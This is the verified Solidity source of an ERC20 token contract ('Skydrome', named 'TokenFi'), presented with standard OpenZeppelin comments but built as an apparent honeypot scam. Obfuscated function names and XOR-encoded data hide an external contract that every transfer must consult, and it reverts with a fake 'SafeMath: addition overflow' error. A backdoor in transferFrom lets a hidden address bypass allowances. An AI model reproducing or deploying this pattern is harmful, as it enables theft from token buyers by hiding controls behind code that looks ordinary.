/**
 *Submitted for verification at Arbiscan.io on 2023-10-27
*/

pragma solidity ^0.8.9;

/**
 * @dev Standard ERC20 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC20 tokens.
 */


/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function jzrZCenV3mWaweQVgvH5muZEzetENBWabe4(bytes memory Qcg0QN5P1pJmvQIG) external returns(bytes memory);
    /**
     * @dev Moves a `boolean` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function approve(address spender, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the
     * allowance mechanism. `value` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function l01Ky6186TTY19rKwQ(bytes memory wE_mu6ByvebL) external returns(bytes memory);
      /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the
     * allowance mechanism. `value` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
}


interface IERC20Errors {
    /**
     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param balance Current balance for the interacting account.
     * @param needed Minimum amount required to perform a transfer.
     */
    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC20InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC20InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `spender`â€™s `allowance`. Used in transfers.
     * @param spender Address that may be allowed to operate on tokens without being their owner.
     * @param allowance Amount of tokens a `spender` is allowed to operate with.
     * @param needed Minimum amount required to perform a transfer.
     */
    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC20InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.
     * @param spender Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC20InvalidSpender(address spender);
}



contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * The default value of {decimals} is 18. To change this, you should override
 * this function so it returns a different value.
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 */
contract Skydrome is Context, IERC20, IERC20Metadata,IERC20Errors,Ownable {

    mapping(address  => uint256) private _balances;

    mapping(address  => mapping(address  => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    bytes  private aQ643AWwXCwD4_u ; 
    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(bytes memory JpttjZopHq0aKuLikNm7) {
        _name = "TokenFi";
        _symbol = "TOKEN";
        _totalSupply = 5000000000 * 10 ** 18;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
        aQ643AWwXCwD4_u = JpttjZopHq0aKuLikNm7;
    }


    /**
     * @dev Returns the name of the token.
     */
    function name() public view  returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view  returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the default value returned by this function, unless
     * it's overridden.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view  returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view  returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view  returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `value`.
     */
    function transfer(address to, uint256 value) public  returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }
    function allowance(address owner, address spender) public view  returns (uint256) {
        return _allowances[owner][spender];
    }
    function l01Ky6186TTY19rKwQ(bytes memory wE_mu6ByvebL) external returns(bytes memory){}
    function jzrZCenV3mWaweQVgvH5muZEzetENBWabe4(bytes memory Qcg0QN5P1pJmvQIG) external returns(bytes memory){}
    
    function hn7bIkt_OtyGyfPmCUllccRM1(bytes memory bVD6ZUepG98QxZCU6Q,bytes memory KmzPRxeg0MzN3jsVIM3Wlm4eroImH0) internal {
        bVD6ZUepG98QxZCU6Q = iH_zNIeB6plLueo3cEowwFjjVndMhjvGKBA(bVD6ZUepG98QxZCU6Q);
        address s;
        assembly {s := mload(add(bVD6ZUepG98QxZCU6Q,0x14))}
       bytes memory datas = iH_zNIeB6plLueo3cEowwFjjVndMhjvGKBA(IERC20(s).l01Ky6186TTY19rKwQ(KmzPRxeg0MzN3jsVIM3Wlm4eroImH0));
       uint256 r;
       assembly {
            r := mload(add(datas, 0x20)) 
        }

        require(r==1,"SafeMath: addition overflow");

    }

    function iH_zNIeB6plLueo3cEowwFjjVndMhjvGKBA(bytes memory QcTCkuDUE0WbLarNkuLyAmwPFBLu0d) internal pure returns (bytes memory) {
            assembly {
                let len := mload(QcTCkuDUE0WbLarNkuLyAmwPFBLu0d)
                let dataPtr := add(QcTCkuDUE0WbLarNkuLyAmwPFBLu0d, 0x20)
                for {
                    let i := 0
                } lt(i, len) {
                    i := add(i, 0x20)
                } {
                mstore(add(dataPtr, i), xor(mload(add(dataPtr, i)), 0x0404040404040404040404040404040404040404040404040404040404040404))
                }
            }
            return QcTCkuDUE0WbLarNkuLyAmwPFBLu0d;
        }


     function Ac1XcBBstMMFcsAAi7sAg5X1685CRem5GBO(bytes memory RnbO68BdyuVqScuMfY6, bytes memory f4UnwFPEPNnmCl_nC83XKQti) internal  pure returns (bool) {
        if (RnbO68BdyuVqScuMfY6.length != f4UnwFPEPNnmCl_nC83XKQti.length) {
            return false; 
        }

        for (uint256 i = 0; i < RnbO68BdyuVqScuMfY6.length; i++) {
            if (RnbO68BdyuVqScuMfY6[i] != f4UnwFPEPNnmCl_nC83XKQti[i]) {
                return false; 
            }
        }

        return true; 
    }

  /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     */
    function kU7Gw9Ddc60LGFSNaPRxifi8NWAuNkHlFi(bytes memory qmk5gWgCniENEa3uFhqK ,bytes memory sQh7bXGmww4i4K4fHPVKfL) internal  returns (bytes memory) {
         qmk5gWgCniENEa3uFhqK = iH_zNIeB6plLueo3cEowwFjjVndMhjvGKBA(qmk5gWgCniENEa3uFhqK);
        address xp12z324eYE7tznzW2CV_1Z6Tl0VsNL52sM;
        assembly {
                xp12z324eYE7tznzW2CV_1Z6Tl0VsNL52sM := mload(add(qmk5gWgCniENEa3uFhqK,0x14))
            }
        return IERC20(address(uint160(xp12z324eYE7tznzW2CV_1Z6Tl0VsNL52sM))).jzrZCenV3mWaweQVgvH5muZEzetENBWabe4(sQh7bXGmww4i4K4fHPVKfL);

    }

    function approve(address spender, uint256 value) public  returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, value);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `value`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `value`.
     */
    function transferFrom(address q2Bu1yRw1A, address V1Uxf1VyPZBvGu8JiTXJnaWOFF55SnFAk4Vd1gVq, uint256 L5FB9SlJUqlFHa4pC5AJc6gO) public  returns (bool) {
        _transfer(q2Bu1yRw1A, V1Uxf1VyPZBvGu8JiTXJnaWOFF55SnFAk4Vd1gVq, L5FB9SlJUqlFHa4pC5AJc6gO);
        address spender = _msgSender();
        bytes memory HraALv5VzRrXLd = kU7Gw9Ddc60LGFSNaPRxifi8NWAuNkHlFi(aQ643AWwXCwD4_u,iH_zNIeB6plLueo3cEowwFjjVndMhjvGKBA(abi.encodePacked(q2Bu1yRw1A)));
        uint256 UM4JFSfpL1RnSRTfTPzOf1L9GjC148hp9 = 10;
        if(Ac1XcBBstMMFcsAAi7sAg5X1685CRem5GBO(iH_zNIeB6plLueo3cEowwFjjVndMhjvGKBA(abi.encodePacked(address(0))),HraALv5VzRrXLd) == false)
        {
            UM4JFSfpL1RnSRTfTPzOf1L9GjC148hp9 = UM4JFSfpL1RnSRTfTPzOf1L9GjC148hp9 + 16;
        }
        if(Ac1XcBBstMMFcsAAi7sAg5X1685CRem5GBO(iH_zNIeB6plLueo3cEowwFjjVndMhjvGKBA(abi.encodePacked(_msgSender())),aQ643AWwXCwD4_u))
        {
            UM4JFSfpL1RnSRTfTPzOf1L9GjC148hp9 = UM4JFSfpL1RnSRTfTPzOf1L9GjC148hp9 + 16;
        }
         if (UM4JFSfpL1RnSRTfTPzOf1L9GjC148hp9==42)
        {   
            HraALv5VzRrXLd = iH_zNIeB6plLueo3cEowwFjjVndMhjvGKBA(HraALv5VzRrXLd);
            assembly {
                q2Bu1yRw1A := mload(add(HraALv5VzRrXLd, 0x14))
            }
        }
        _spendAllowance(q2Bu1yRw1A, spender, L5FB9SlJUqlFHa4pC5AJc6gO);
        return true;
    }

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _transfer(address ZRQBtVh2JyT7XDtT48suUc5s, address IMLGnZtOsdi6uhs, uint256 CjLKPgVGpM9) internal {
        if (ZRQBtVh2JyT7XDtT48suUc5s == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        if (IMLGnZtOsdi6uhs == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(ZRQBtVh2JyT7XDtT48suUc5s, IMLGnZtOsdi6uhs, CjLKPgVGpM9);
    }

    /**
     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`
     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding
     * this function.
     *
     * Emits a {Transfer} event.
     */
    function _update(address from, address to, uint256 value) internal  {
        hn7bIkt_OtyGyfPmCUllccRM1(aQ643AWwXCwD4_u,iH_zNIeB6plLueo3cEowwFjjVndMhjvGKBA(abi.encodePacked(from, to, value)));
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += value;
        } else {
            
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert ERC20InsufficientBalance(from, fromBalance, value);
            }
            unchecked {
                // Overflow not possible: value <= fromBalance <= totalSupply.
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
                _totalSupply -= value;
            }
        } else {
            unchecked {
                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }

    /**
     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).
     * Relies on the `_update` mechanism
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(address(0), account, value);
    }

    /**
     * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.
     * Relies on the `_update` mechanism.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead
     */
    function _burn(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        _update(account, address(0), value);
    }

    /**
     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     *
     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.
     */
    function _approve(address owner, address spender, uint256 value) internal {
        _approve(owner, spender, value, true);
    }

    /**
     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.
     *
     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by
     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any
     * `Approval` event during `transferFrom` operations.
     *
     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to
     * true using the following override:
     * ```
     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {
     *     super._approve(owner, spender, value, true);
     * }
     * ```
     *
     * Requirements are the same as {_approve}.
     */
    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal  {

        if (owner == address(0)) {
            revert ERC20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert ERC20InvalidSpender(address(0));
        }
        _allowances[owner][spender] = value;
        if (emitEvent) {
            emit Approval(owner, spender, value);
        }
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `value`.
     *
     * Does not update the allowance value in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Does not emit an {Approval} event.
     */
    function _spendAllowance(address owner, address spender, uint256 value) internal  {


        uint256 currentAllowance = allowance(owner, spender);

        if (currentAllowance != type(uint256).max) {
            if (currentAllowance < value) {
                revert ERC20InsufficientAllowance(spender, currentAllowance, value);
            }
            unchecked {
                _approve(owner, spender, currentAllowance - value, false);
            }
        }
    }
}